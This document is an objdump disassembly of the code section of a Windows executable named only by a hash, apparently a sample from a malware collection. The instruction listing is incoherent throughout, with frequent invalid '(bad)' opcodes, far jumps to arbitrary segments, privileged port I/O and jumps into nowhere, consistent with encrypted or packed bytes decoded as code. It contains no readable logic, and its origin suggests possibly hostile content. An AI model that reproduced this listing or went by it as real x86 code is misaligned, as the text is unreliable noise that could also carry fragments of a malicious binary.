
b4ab0dd3ede49fc4018cf3cf80dabb76c66efe522285491dfd961d85a9c54768.exe:     file format pei-i386


Disassembly of section .text:

00411000 <.text>:
  411000:	fninit 
  411002:	mov    al,ds:0x2457d75e
  411007:	push   ss
  411008:	int    0x4c
  41100a:	jns    0x411034
  41100c:	rcr    BYTE PTR [ebx-0x65],cl
  41100f:	(bad)  
  411010:	popa   
  411011:	push   0x10
  411013:	lea    ecx,[edi+edi*8+0x1e]
  411017:	sub    BYTE PTR [ecx-0x4f24d31f],dl
  41101d:	test   al,0xbf
  41101f:	mov    ds:0xb22e006b,al
  411024:	call   0x25e0:0x19656aa1
  41102b:	push   cs
  41102c:	les    ecx,FWORD PTR [ecx+esi*1]
  41102f:	jmp    0x2717a81f
  411034:	(bad)  
  411035:	loop   0x410fbf
  411037:	sti    
  411038:	out    0xb6,eax
  41103a:	mov    ebp,0x381ab4bd
  41103f:	sti    
  411040:	pop    ds
  411041:	in     eax,0x8e
  411043:	xchg   esp,eax
  411044:	cmp    al,0x16
  411046:	sub    dl,BYTE PTR [ebp-0x1d6df311]
  41104c:	cmova  eax,DWORD PTR [edx]
  41104f:	adc    bh,BYTE PTR [ebp-0xe]
  411052:	pop    ds
  411053:	iret   
  411054:	div    ah
  411056:	cdq    
  411057:	pop    eax
  411058:	mov    bl,0x14
  41105a:	sub    BYTE PTR [eax],ch
  41105c:	loope  0x4110d5
  41105e:	push   0x9d9ffd2f
  411063:	sti    
  411064:	jl     0x4110a3
  411066:	xchg   ebp,eax
  411067:	lds    esp,FWORD PTR [ecx+0x7961fae8]
  41106d:	mov    al,ds:0xde6c2460
  411072:	fcom   DWORD PTR [esi+0x29bd3822]
  411078:	and    eax,0x5ff08fa4
  41107d:	and    al,0x92
  41107f:	loop   0x4110b5
  411081:	(bad)  
  411082:	test   DWORD PTR [ebp+eax*2+0x4b],0x42d78917
  41108a:	test   BYTE PTR [edx],dh
  41108c:	jmp    0x3a84:0x95ee83db
  411093:	js     0x411065
  411095:	xor    al,0x5c
  411097:	or     al,0xce
  411099:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41109a:	fstp   TBYTE PTR [ebp+ecx*4+0x69]
  41109e:	sub    ecx,edi
  4110a0:	mov    ah,0x57
  4110a2:	cmp    BYTE PTR [ebp-0x352c2de6],cl
  4110a8:	mov    cl,0xa7
  4110aa:	and    al,0x9e
  4110ac:	js     0x4110bc
  4110ae:	adc    al,0x54
  4110b0:	shl    BYTE PTR [ecx-0x78],1
  4110b3:	pop    edi
  4110b4:	and    ecx,0x2504c307
  4110ba:	or     eax,0x7db85d98
  4110bf:	cs retf 0x1c7e
  4110c3:	dec    ecx
  4110c4:	sub    cl,BYTE PTR [esi-0x7a]
  4110c7:	push   ebx
  4110c8:	cmp    eax,0xe839e337
  4110cd:	inc    esp
  4110ce:	fdiv   QWORD PTR [edi-0x1e]
  4110d1:	(bad)  [esp+ebx*2+0x57b2e790]
  4110d8:	pop    ebp
  4110d9:	and    DWORD PTR [eax+ebp*1+0x42],esi
  4110dd:	mov    ah,0x59
  4110df:	xor    BYTE PTR [edx+0x50],dl
  4110e2:	scas   al,BYTE PTR es:[edi]
  4110e3:	sbb    eax,0xd0c030c1
  4110e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4110e9:	and    eax,0x32b6780b
  4110ee:	repnz inc esi
  4110f0:	pop    eax
  4110f1:	pop    ds
  4110f2:	shl    edi,0xc5
  4110f5:	in     al,dx
  4110f6:	and    al,0x2b
  4110f8:	xor    al,0xf
  4110fa:	inc    esp
  4110fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4110fc:	cld    
  4110fd:	inc    ebx
  4110fe:	popa   
  4110ff:	add    al,0x75
  411101:	and    ecx,DWORD PTR [eax+0x3c]
  411104:	in     eax,0x96
  411106:	push   ss
  411107:	mov    ch,0xbe
  411109:	adc    DWORD PTR [eax],esp
  41110b:	fcom   DWORD PTR [ecx]
  41110d:	fsubr  DWORD PTR [ebx+0x7bdf8b2d]
  411113:	(bad)  
  411114:	push   ss
  411115:	pop    ebp
  411116:	xor    DWORD PTR [ebx-0x2148abfd],ebp
  41111c:	push   edx
  41111d:	inc    esp
  41111e:	mov    ah,ah
  411120:	ss loopne 0x4110e2
  411123:	mov    dl,0xa1
  411125:	rcl    DWORD PTR [ecx+0x5ad8580c],0xeb
  41112c:	nop
  41112d:	sub    ebp,ebx
  41112f:	sub    al,0xf2
  411131:	(bad)  
  411132:	stc    
  411133:	push   cs
  411134:	imul   ebx,DWORD PTR [ecx+0x625aecf2],0x44
  41113b:	xor    BYTE PTR [esi],al
  41113d:	imul   eax,DWORD PTR [edx],0xffffffc0
  411140:	adc    al,0xdd
  411142:	mov    edx,0xffe0ff40
  411147:	cwde   
  411148:	push   0x626d5516
  41114d:	and    BYTE PTR [ebp+ecx*1+0x5905206e],dh
  411154:	bswap  ebx
  411156:	dec    esi
  411157:	jae    0x411111
  411159:	mov    ?,eax
  41115b:	dec    edx
  41115c:	mov    al,0xde
  41115e:	push   ds
  41115f:	mov    esi,0x8a867894
  411164:	outs   dx,DWORD PTR ds:[si]
  411166:	mov    bh,BYTE PTR [edx]
  411168:	int    0x89
  41116a:	and    ebp,0x2e
  41116d:	popf   
  41116e:	xor    eax,0x2ab049c0
  411173:	xor    eax,0x200743ae
  411178:	fadd   DWORD PTR [edi-0x3f8859cc]
  41117e:	jp     0x411125
  411180:	test   BYTE PTR [ecx],bh
  411182:	or     dh,BYTE PTR [ebx]
  411184:	loop   0x4111dd
  411186:	fst    DWORD PTR [eax-0x4efa872c]
  41118c:	and    ah,BYTE PTR [ecx+0x6e94a272]
  411192:	push   ebx
  411193:	stc    
  411194:	test   BYTE PTR [ecx+eax*8+0x1f],bh
  411198:	aaa    
  411199:	sub    edi,DWORD PTR [ecx-0x74]
  41119c:	(bad)  
  41119d:	push   edi
  41119e:	pushf  
  41119f:	and    esi,DWORD PTR [ebp-0x60f26add]
  4111a5:	call   0x27b5:0x8c72f329
  4111ac:	add    al,0xfc
  4111ae:	jae    0x41113a
  4111b0:	int    0xae
  4111b2:	arpl   WORD PTR [esi-0x45],cx
  4111b5:	shl    DWORD PTR ds:0x39b5cbcd,cl
  4111bb:	cpuid  
  4111bd:	mov    dl,0xef
  4111bf:	mov    DWORD PTR [edx],ebp
  4111c1:	fsub   st(6),st
  4111c3:	mov    al,0x2e
  4111c5:	mov    DWORD PTR [ecx-0x2a12e479],edx
  4111cb:	xchg   edx,eax
  4111cc:	mov    ah,0xad
  4111ce:	dec    esp
  4111cf:	cli    
  4111d0:	xor    BYTE PTR [ecx-0x202321e8],bh
  4111d6:	mov    ds:0xc9bdcff6,eax
  4111db:	jmp    0x41121e
  4111dd:	fiadd  WORD PTR [ebp-0x2ad4eacf]
  4111e3:	sub    BYTE PTR [edx-0x5c7f04dd],bh
  4111e9:	gs aas 
  4111eb:	dec    ebx
  4111ec:	push   ebx
  4111ed:	xor    eax,0x596f0913
  4111f2:	adc    al,0x33
  4111f4:	cli    
  4111f5:	fidivr DWORD PTR [esi]
  4111f7:	xchg   esi,eax
  4111f8:	cmp    BYTE PTR [esp+ebp*4+0x437fef6c],0x1f
  411200:	xlat   BYTE PTR ds:[ebx]
  411201:	inc    ecx
  411202:	shr    edx,1
  411204:	ja     0x41123b
  411206:	adc    DWORD PTR [ebx+eax*1],edx
  411209:	mov    WORD PTR [edx+0x1841f706],gs
  41120f:	dec    ebx
  411210:	popa   
  411211:	lods   eax,DWORD PTR ds:[esi]
  411212:	pop    esi
  411213:	jg     0x4111f6
  411215:	iret   
  411216:	xor    BYTE PTR ds:0x8505aa7,cl
  41121c:	mov    esp,0x30d57309
  411221:	ret    0x4cc8
  411224:	push   ebp
  411225:	pop    esi
  411226:	xchg   DWORD PTR [esi],edx
  411228:	mov    eax,0xc3d04eb0
  41122d:	repz leave 
  41122f:	jae    0x41123e
  411231:	leave  
  411232:	cmp    ah,cl
  411234:	add    esp,DWORD PTR [eax-0x469b8f09]
  41123a:	inc    esp
  41123b:	push   edx
  41123c:	mov    al,0x56
  41123e:	int    0x22
  411240:	mov    esi,0x92ee238
  411245:	add    esp,ecx
  411247:	es push cs
  411249:	add    al,0x4b
  41124b:	outs   dx,BYTE PTR ds:[esi]
  41124c:	xchg   edi,eax
  41124d:	les    ebx,FWORD PTR [edi+0x5682bdd0]
  411253:	jge    0x411219
  411255:	jmp    0x28a6:0x36847b0c
  41125c:	inc    edi
  41125d:	adc    al,0x88
  41125f:	repnz iret 
  411261:	mov    dh,0x70
  411263:	xchg   esp,eax
  411264:	les    ebp,FWORD PTR [edx-0x313d7059]
  41126a:	loop   0x411239
  41126c:	xor    eax,DWORD PTR [edx]
  41126e:	mov    ebp,0x6649a692
  411273:	or     ecx,DWORD PTR [edx-0x567370ca]
  411279:	xor    esi,ecx
  41127b:	push   ss
  41127c:	jae    0x4112de
  41127e:	out    dx,al
  41127f:	fwait
  411280:	xor    edx,0x62032e7b
  411286:	sbb    ecx,DWORD PTR [edx-0x3c4f2675]
  41128c:	arpl   WORD PTR [edx],bx
  41128e:	into   
  41128f:	fmul   DWORD PTR [esi+esi*4+0x29d6cf11]
  411296:	dec    esi
  411297:	loope  0x4112f2
  411299:	not    BYTE PTR [ebx-0x5f]
  41129c:	fidivr WORD PTR [ecx]
  41129e:	dec    eax
  41129f:	mov    dh,0xbc
  4112a1:	mov    ch,0xf9
  4112a3:	rcr    DWORD PTR [ecx],cl
  4112a5:	mov    ch,0x1e
  4112a7:	js     0x4112d9
  4112a9:	mov    eax,ds:0x8413578d
  4112ae:	shl    DWORD PTR [esi-0x6d],0xf9
  4112b2:	mov    ebp,eax
  4112b4:	xor    BYTE PTR [edi+0x78],0x70
  4112b8:	and    DWORD PTR [esp+ebp*2],ebx
  4112bb:	dec    esi
  4112bc:	fistp  QWORD PTR [eax-0x26]
  4112bf:	dec    esi
  4112c0:	mov    bl,BYTE PTR ds:0x27f2a456
  4112c6:	shl    BYTE PTR [eax+ebp*8],1
  4112c9:	inc    ecx
  4112ca:	cmp    ebp,ebp
  4112cc:	xchg   ecx,eax
  4112cd:	cmp    ecx,edx
  4112cf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4112d0:	sub    al,0xf
  4112d2:	in     al,0x31
  4112d4:	sbb    DWORD PTR [edx-0x5ef7d443],edi
  4112da:	mov    ah,0x8d
  4112dc:	sahf   
  4112dd:	sub    BYTE PTR [ebx],al
  4112df:	mov    al,ds:0xf729ebf9
  4112e4:	mov    ebp,0xb3a1f1df
  4112e9:	out    0xae,eax
  4112eb:	stc    
  4112ec:	inc    esp
  4112ed:	mov    ebx,0x411ec8e1
  4112f2:	int    0x4a
  4112f4:	in     eax,0xce
  4112f6:	mov    ecx,0x66755b8
  4112fb:	loope  0x411370
  4112fd:	pop    esp
  4112fe:	dec    ebx
  4112ff:	mov    ch,0x28
  411301:	jp     0x4112a6
  411303:	out    dx,eax
  411304:	sbb    eax,0x7d88c320
  411309:	mov    edi,0xfac0d2f6
  41130e:	scas   al,BYTE PTR es:[edi]
  41130f:	sub    al,0xbb
  411311:	std    
  411312:	in     al,0xd6
  411314:	xchg   DWORD PTR [edx],ecx
  411316:	call   0x90d601d7
  41131b:	add    ebx,DWORD PTR [eax]
  41131d:	ret    0x4d7f
  411320:	ja     0x411334
  411322:	pusha  
  411323:	push   ebp
  411324:	xor    cl,ah
  411326:	fst    DWORD PTR [ebx-0x34]
  411329:	mov    ecx,edi
  41132b:	les    edi,FWORD PTR [edx]
  41132d:	mov    ebp,fs
  41132f:	push   esp
  411330:	sub    eax,0x64781f14
  411335:	imul   esp,esp,0x34
  411338:	clc    
  411339:	add    eax,0x978addf8
  41133e:	cld    
  41133f:	cmp    DWORD PTR [ebx-0x8],eax
  411342:	data16 sub BYTE PTR [edi+0x6d],bl
  411346:	add    BYTE PTR [ecx-0x3db088ad],0xd2
  41134d:	xor    eax,0x48fe3f3b
  411352:	fucom  st(4)
  411354:	and    DWORD PTR [edi-0x3f0fce01],0xd
  41135b:	mov    eax,ds:0xb1be9f25
  411360:	push   eax
  411361:	push   ss
  411362:	add    bl,dl
  411364:	popf   
  411365:	jne    0x65afbc9b
  41136b:	and    ah,BYTE PTR [edx-0x12]
  41136e:	jnp    0x4113be
  411370:	loope  0x411313
  411372:	mov    bh,0xa0
  411374:	call   0xc87bb85e
  411379:	xchg   ecx,eax
  41137a:	fs pop ebx
  41137c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41137d:	sbb    cl,BYTE PTR [edi+0x24e87831]
  411383:	xlat   BYTE PTR ds:[ebx]
  411385:	les    edi,FWORD PTR [ebx+esi*2-0x15]
  411389:	or     al,0xad
  41138b:	mov    dh,0x85
  41138d:	inc    edi
  41138e:	push   ecx
  41138f:	mov    cl,0x88
  411391:	add    al,0x36
  411393:	jb     0x411389
  411395:	ret    
  411396:	imul   BYTE PTR [ebx+0x7d]
  411399:	cdq    
  41139a:	jl     0x41132a
  41139c:	test   BYTE PTR ss:[esi-0x17],bl
  4113a0:	cdq    
  4113a1:	dec    edi
  4113a2:	fcom   QWORD PTR [esi-0x5b]
  4113a5:	leave  
  4113a6:	test   DWORD PTR [edx-0x2280c363],ecx
  4113ac:	icebp  
  4113ad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113ae:	lods   eax,DWORD PTR ds:[esi]
  4113af:	adc    al,0x89
  4113b1:	push   ebx
  4113b2:	mov    ds:0x29515ab1,al
  4113b7:	aaa    
  4113b8:	jl     0x41141b
  4113ba:	int3   
  4113bb:	aad    0x4f
  4113bd:	and    BYTE PTR [ebx+0x50c408a5],dh
  4113c3:	fst    QWORD PTR [ebp+0x63cd46da]
  4113c9:	(bad)  
  4113ca:	std    
  4113cb:	or     eax,0x7f2442a6
  4113d0:	int    0xab
  4113d2:	pop    eax
  4113d3:	shr    DWORD PTR [ecx-0x20a82a9c],cl
  4113d9:	inc    esi
  4113da:	iret   
  4113db:	fstp   TBYTE PTR [ebx-0x2df16d5b]
  4113e1:	ja     0x411385
  4113e3:	addr16 sti 
  4113e5:	jns    0x4113a4
  4113e7:	cld    
  4113e8:	cmp    edx,DWORD PTR [ebx+0x751061c9]
  4113ee:	dec    esi
  4113ef:	cmc    
  4113f0:	jl     0x4113d3
  4113f2:	pop    edi
  4113f3:	arpl   cx,dx
  4113f5:	out    0x42,al
  4113f7:	or     al,0x13
  4113f9:	fwait
  4113fa:	ja     0x411450
  4113fc:	sbb    ebx,DWORD PTR [ebx]
  4113fe:	(bad)  [esi-0x1]
  411401:	xchg   edi,eax
  411402:	and    al,0x4b
  411404:	adc    ecx,DWORD PTR [ebx+ebx*2]
  411407:	jne    0x411425
  411409:	xchg   ah,bh
  41140b:	and    ah,BYTE PTR [edx-0x956915d]
  411411:	out    0x4d,al
  411413:	lahf   
  411414:	call   0xfec15cb5
  411419:	mov    ds:0xb3935f92,eax
  41141e:	retf   
  41141f:	aaa    
  411420:	xor    al,0xa2
  411422:	cmp    al,0xc4
  411424:	inc    ebp
  411425:	rcr    BYTE PTR [ebp-0x3482bd0d],1
  41142b:	add    ebx,DWORD PTR [edi]
  41142d:	stos   DWORD PTR es:[edi],eax
  41142e:	arpl   WORD PTR [eax-0x22],si
  411431:	jecxz  0x411401
  411433:	jg     0x33333ccf
  411439:	adc    al,0x5e
  41143b:	cmp    esi,DWORD PTR [ecx]
  41143d:	in     eax,0xd5
  41143f:	sub    edi,DWORD PTR [ebx]
  411441:	aaa    
  411442:	push   edi
  411443:	push   0x924ac991
  411448:	sub    ebp,DWORD PTR [ecx]
  41144a:	mov    esp,0x4c22d5
  41144f:	push   edx
  411450:	fs push esi
  411452:	pop    ss
  411453:	fs inc edi
  411455:	(bad)  [eax+0x4e372864]
  41145b:	pop    eax
  41145c:	mov    dh,0xaa
  41145e:	jp     0x41142b
  411460:	sub    dl,0x66
  411463:	cmp    dl,bl
  411465:	xor    dl,ch
  411467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411468:	adc    BYTE PTR [esi],dl
  41146a:	inc    ecx
  41146b:	push   ecx
  41146c:	adc    DWORD PTR gs:[eax+0x741bb3d2],eax
  411473:	test   al,0xf4
  411475:	xchg   esi,eax
  411476:	xor    BYTE PTR [esi],dl
  411478:	push   ds
  411479:	fwait
  41147a:	cmp    al,0xc3
  41147c:	adc    BYTE PTR [ecx],0xf9
  41147f:	cld    
  411480:	sub    edi,DWORD PTR [esi+0x59d638c4]
  411486:	cmp    DWORD PTR [ebx],ebp
  411488:	call   0x7703:0xcc065410
  41148f:	es pop esi
  411491:	sbb    al,0x8b
  411493:	push   eax
  411494:	mov    ebx,0x406f76c4
  411499:	fdivrp st(3),st
  41149b:	arpl   WORD PTR [edi],ax
  41149d:	cmp    DWORD PTR [ebp-0x1894f85f],ebx
  4114a3:	cmp    esi,ebp
  4114a5:	mov    ah,0x2c
  4114a7:	xor    al,0xd7
  4114a9:	fadd   DWORD PTR es:[ecx+ecx*1+0x5142840a]
  4114b1:	sbb    edi,DWORD PTR [edi+edx*1]
  4114b4:	sub    DWORD PTR [esi+0x64],ecx
  4114b7:	fsub   st(2),st
  4114b9:	push   eax
  4114ba:	sbb    ebp,DWORD PTR [edx-0x699d84c9]
  4114c0:	dec    edi
  4114c1:	fistp  QWORD PTR [ecx]
  4114c3:	call   0x1f17c2f2
  4114c8:	mov    edx,eax
  4114ca:	jns    0x41147d
  4114cc:	dec    eax
  4114cd:	fmul   QWORD PTR [ebx+ebx*8-0x69]
  4114d1:	cmp    eax,0xa51e8f10
  4114d6:	jns    0x411518
  4114d8:	loop   0x4114e5
  4114da:	push   ebp
  4114db:	xchg   BYTE PTR [esi-0x2dfab94c],dl
  4114e1:	fild   DWORD PTR [ebp+ebx*2+0x6c]
  4114e5:	jle    0x4114fb
  4114e7:	mov    bl,0x93
  4114e9:	pop    ss
  4114ea:	push   edx
  4114eb:	dec    bl
  4114ed:	sub    edx,DWORD PTR [ebx+0x79ace36a]
  4114f3:	aam    0x11
  4114f5:	dec    edi
  4114f6:	push   edi
  4114f7:	or     al,0x7d
  4114f9:	pop    esi
  4114fa:	mov    ebp,0x439a1b0a
  4114ff:	dec    ebp
  411500:	adc    eax,0x6d902f3e
  411505:	test   esp,ebp
  411507:	shl    BYTE PTR [ecx],1
  411509:	xchg   esp,eax
  41150a:	push   ss
  41150b:	sbb    ebp,DWORD PTR [ecx]
  41150d:	add    DWORD PTR [esi+0x5d4bf4e3],ecx
  411513:	cwde   
  411514:	cli    
  411515:	test   BYTE PTR [edi],0xef
  411518:	(bad)  
  411519:	and    BYTE PTR [edx+0x3a5d5904],dh
  41151f:	lds    edi,FWORD PTR [edi+edi*2-0x79942ecd]
  411526:	cs xchg esp,eax
  411528:	mov    bl,0x9a
  41152a:	xchg   ebp,eax
  41152b:	lds    esp,FWORD PTR [eax+0x11]
  41152e:	popa   
  41152f:	and    al,0x7b
  411531:	mov    ds:0x3bbd82b0,al
  411536:	(bad)  
  411537:	(bad)  
  411538:	pop    edx
  411539:	jae    0x411587
  41153b:	ins    DWORD PTR es:[edi],dx
  41153c:	sub    eax,0xd9a02fb5
  411541:	xor    ah,al
  411543:	mov    bh,0x30
  411545:	ret    
  411546:	pop    edi
  411547:	jp     0x4114e4
  411549:	dec    ecx
  41154a:	ja     0x4114dd
  41154c:	cmc    
  41154d:	dec    ebp
  41154e:	sub    eax,0xfcced89e
  411553:	mov    edx,0x600fbe02
  411558:	sub    ecx,DWORD PTR [edi+0x4cec5dd3]
  41155e:	xchg   ecx,eax
  41155f:	pop    ss
  411560:	je     0x411514
  411562:	jno    0x411520
  411564:	sbb    ebx,DWORD PTR [edi]
  411566:	daa    
  411567:	add    BYTE PTR ds:0x9aacbd7b,dl
  41156d:	sub    BYTE PTR [ecx+ebp*2-0x73f849e1],dh
  411574:	(bad)  
  411575:	frstor [esi+0x6c]
  411578:	nop
  411579:	push   0x3e
  41157b:	xor    al,0x2a
  41157d:	mov    esp,0xb4f88127
  411582:	in     al,0xe4
  411584:	mov    esi,0x17627ad7
  411589:	pop    eax
  41158a:	inc    eax
  41158b:	cmc    
  41158c:	push   ds
  41158d:	xchg   ecx,eax
  41158e:	sbb    DWORD PTR [ebx],ebx
  411590:	ins    BYTE PTR es:[edi],dx
  411591:	xchg   edx,eax
  411592:	push   ebp
  411593:	lods   eax,DWORD PTR ds:[esi]
  411594:	sti    
  411595:	sub    ecx,eax
  411597:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411598:	fld    TBYTE PTR [edx-0x59717670]
  41159e:	mov    esp,0x6a090149
  4115a3:	mov    eax,ds:0x8ef9611c
  4115a8:	dec    edx
  4115a9:	lods   eax,DWORD PTR ds:[esi]
  4115aa:	inc    edi
  4115ab:	retf   0xae20
  4115ae:	sub    bl,BYTE PTR [edx+0x76]
  4115b1:	or     al,0xbf
  4115b3:	jp     0x411597
  4115b5:	lds    ecx,FWORD PTR [edi+0x36]
  4115b8:	xchg   DWORD PTR [edi],edx
  4115ba:	hlt    
  4115bb:	mov    dh,0x4e
  4115bd:	cmp    ah,BYTE PTR [ecx+0x6aa0dc9b]
  4115c3:	cdq    
  4115c4:	inc    ecx
  4115c5:	and    BYTE PTR [eax],0x4f
  4115c8:	push   es
  4115c9:	inc    edi
  4115ca:	into   
  4115cb:	add    BYTE PTR [edi+0x62e17234],dh
  4115d1:	cmp    DWORD PTR [edx+0x2f],edi
  4115d4:	jo     0x411596
  4115d6:	stos   BYTE PTR es:[edi],al
  4115d7:	inc    ebx
  4115d8:	cmp    eax,0xfecd5e25
  4115dd:	in     eax,0x3c
  4115df:	or     al,0x27
  4115e1:	or     DWORD PTR [ebx+eiz*2],0xbaa5165b
  4115e8:	add    ebp,esp
  4115ea:	ret    0xf6f7
  4115ed:	es jne 0x411662
  4115f0:	mov    ecx,0x355e04e4
  4115f5:	test   BYTE PTR [eax-0x1e6fa2d9],dh
  4115fb:	xlat   BYTE PTR ds:[ebx]
  4115fc:	call   DWORD PTR [edi-0x78]
  4115ff:	inc    ecx
  411600:	mov    dl,0x79
  411602:	xchg   edx,eax
  411603:	xchg   ecx,eax
  411604:	inc    esi
  411605:	cli    
  411606:	aad    0xc9
  411608:	shl    DWORD PTR [esi-0x68],1
  41160b:	(bad)  
  41160c:	cmp    DWORD PTR [eax-0x7aabc664],esi
  411612:	mov    esp,0x1e22761f
  411617:	clc    
  411618:	aam    0x9b
  41161a:	jl     0x4115b5
  41161c:	add    eax,0xf7c7bcef
  411621:	xor    BYTE PTR [edx+esi*2],ah
  411624:	add    ah,BYTE PTR [edi+0x6e8dea48]
  41162a:	in     eax,0x41
  41162c:	push   0xcc88e2bb
  411631:	imul   ebp,edi,0x86fe170f
  411637:	and    BYTE PTR [esp+ecx*2+0x3e],bl
  41163b:	jno    0x4115c3
  41163d:	or     DWORD PTR [eax],0xffffff9e
  411640:	sub    esp,DWORD PTR [ecx-0x379f79cf]
  411646:	aas    
  411647:	rcr    BYTE PTR ds:[eax],1
  41164a:	inc    esp
  41164b:	hlt    
  41164c:	shl    BYTE PTR ds:0x60ec99de,cl
  411652:	push   esp
  411653:	adc    ch,BYTE PTR ds:0x6917833
  411659:	ror    DWORD PTR [ebx],1
  41165b:	jbe    0x41167c
  41165d:	and    dh,BYTE PTR [eax]
  41165f:	jmp    0xb39c:0xfd8bbfc0
  411666:	(bad)  
  411667:	out    0x54,eax
  411669:	mov    bh,0xfe
  41166b:	xor    eax,0x48bff16f
  411670:	or     al,0x5b
  411672:	sbb    al,0xd
  411674:	cmp    al,0xf1
  411676:	ret    0x2e8e
  411679:	cmp    BYTE PTR [ecx+0x1c],ch
  41167c:	arpl   WORD PTR ds:0x7e7cc5f6,di
  411682:	mov    ecx,0x6e572507
  411687:	adc    bh,BYTE PTR [edx+0xcacd983]
  41168d:	and    ah,bh
  41168f:	sub    edx,DWORD PTR [ecx-0x6f]
  411692:	sbb    dl,0x79
  411695:	push   cs
  411696:	std    
  411697:	cli    
  411698:	xchg   esi,eax
  411699:	sbb    DWORD PTR fs:[bx+si-0x381f],edx
  41169f:	ror    DWORD PTR [edx],1
  4116a1:	push   0x951b2719
  4116a6:	sar    DWORD PTR [edi+0x63],0x3f
  4116aa:	xchg   esi,eax
  4116ab:	xchg   ebx,eax
  4116ac:	cmp    al,0xef
  4116ae:	lods   eax,DWORD PTR ds:[esi]
  4116af:	fwait
  4116b0:	sbb    eax,0xe2e8e703
  4116b5:	push   esi
  4116b6:	stc    
  4116b7:	out    0xbd,eax
  4116b9:	adc    BYTE PTR [edi-0x68f408a2],dl
  4116bf:	out    0x68,eax
  4116c1:	ss or  eax,0xe07ca21b
  4116c7:	pop    ebx
  4116c8:	mov    ebx,0xac5b054a
  4116cd:	jp     0x41164f
  4116cf:	jle    0x411651
  4116d1:	arpl   WORD PTR [ebx-0x5cf38751],si
  4116d7:	and    al,0x48
  4116d9:	(bad)  
  4116db:	repnz dec edi
  4116dd:	in     eax,0x32
  4116df:	das    
  4116e0:	(bad)  
  4116e1:	mov    BYTE PTR [edx],bh
  4116e3:	(bad)  
  4116e4:	vshufps ymm1,ymm0,ymm3,0x22
  4116e9:	or     ebp,esi
  4116eb:	xlat   BYTE PTR ds:[ebx]
  4116ec:	int3   
  4116ed:	mov    cs,WORD PTR [ecx-0x18]
  4116f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f1:	aam    0xdc
  4116f3:	mov    al,0xb9
  4116f5:	outs   dx,BYTE PTR ds:[esi]
  4116f6:	sub    edi,ebp
  4116f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4116f9:	push   ecx
  4116fa:	ret    
  4116fb:	lea    esi,[edx-0x5a8134cb]
  411701:	iret   
  411702:	jmp    0xba91:0xb62741bf
  411709:	aas    
  41170a:	xchg   ebx,eax
  41170b:	lods   al,BYTE PTR ds:[esi]
  41170c:	rcr    bl,cl
  41170e:	scas   al,BYTE PTR es:[edi]
  41170f:	push   ecx
  411710:	test   BYTE PTR ds:0x3908a0a2,dh
  411716:	test   BYTE PTR [eax-0x2e],0xe7
  41171a:	adc    DWORD PTR [ebx],edi
  41171c:	mov    ds:0x844d056e,eax
  411721:	jae    0x411704
  411723:	retf   0x7b39
  411726:	scas   al,BYTE PTR es:[edi]
  411727:	push   0x56
  411729:	sahf   
  41172a:	sub    eax,0x96e9bbba
  41172f:	mul    edi
  411731:	icebp  
  411732:	and    BYTE PTR [eax],ah
  411734:	std    
  411735:	outs   dx,DWORD PTR ds:[esi]
  411736:	test   eax,0x4ee9ee3a
  41173b:	inc    BYTE PTR [ebx]
  41173d:	jg     0x4117ab
  41173f:	outs   dx,DWORD PTR ds:[esi]
  411740:	jmp    0x411722
  411742:	jae    0x41173e
  411744:	mov    BYTE PTR [edi],ch
  411746:	xchg   ecx,eax
  411747:	sbb    BYTE PTR [edx+eiz*8],dl
  41174a:	add    BYTE PTR es:[ecx+ecx*2+0x372d8349],cl
  411752:	xchg   ebx,eax
  411753:	mov    bl,0x71
  411755:	test   al,0x3d
  411757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411758:	and    eax,0xc4350902
  41175d:	ret    
  41175e:	jno    0x411707
  411760:	mov    BYTE PTR [esi-0x6a],bh
  411763:	mov    al,0x40
  411765:	rcl    dl,1
  411767:	faddp  st(4),st
  411769:	push   ecx
  41176a:	inc    ecx
  41176b:	in     eax,0x8e
  41176d:	or     al,0xc7
  41176f:	shr    edi,0x60
  411772:	jbe    0x411754
  411774:	lock mov dh,0x35
  411777:	cmp    eax,DWORD PTR [edi+0x65]
  41177a:	fadd   DWORD PTR [ecx+edi*2+0x7c]
  41177e:	fwait
  41177f:	cmp    BYTE PTR [ebx],dl
  411781:	jp     0x4117e6
  411783:	mov    ch,0x92
  411785:	popa   
  411786:	sbb    DWORD PTR [ebx+0x32d18a22],edi
  41178c:	sub    BYTE PTR [ebp-0x55d8ee7],0x4c
  411793:	mov    ebx,0x1fd4162c
  411798:	inc    eax
  411799:	mov    ecx,0x6ed84c17
  41179e:	push   ss
  41179f:	mov    esi,0x980ef5e7
  4117a4:	ret    0xb167
  4117a7:	dec    esi
  4117a8:	ins    BYTE PTR es:[edi],dx
  4117a9:	mov    ah,0x4f
  4117ab:	add    eax,0xf519823f
  4117b0:	cdq    
  4117b1:	pop    es
  4117b2:	pop    edx
  4117b3:	push   esp
  4117b4:	inc    ebx
  4117b5:	xor    ebp,edx
  4117b7:	retf   
  4117b8:	bound  edx,QWORD PTR [ebp-0x20]
  4117bb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4117bc:	fnstcw WORD PTR [edx+0x4260dec8]
  4117c2:	stos   DWORD PTR es:[edi],eax
  4117c3:	jbe    0x411768
  4117c5:	push   esi
  4117c6:	mov    ds:0x3a2b9dbc,al
  4117cb:	and    DWORD PTR [edx-0x1f03b231],ebx
  4117d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4117d2:	fs hlt 
  4117d4:	xchg   DWORD PTR [edx+0x73],esp
  4117d7:	cmp    ch,BYTE PTR [edi]
  4117d9:	jmp    0x2576:0xdcbccf6d
  4117e0:	inc    esi
  4117e1:	and    al,bl
  4117e3:	jno    0x4117a8
  4117e5:	cmp    dh,dl
  4117e7:	cmp    BYTE PTR [edx+esi*1+0x4b],cl
  4117eb:	mov    ds:0xf2404c3c,al
  4117f0:	pop    esp
  4117f1:	nop
  4117f2:	or     edi,DWORD PTR ds:0xe3a5c1db
  4117f8:	ja     0x411847
  4117fa:	xlat   BYTE PTR ds:[ebx]
  4117fb:	popf   
  4117fc:	push   0x21
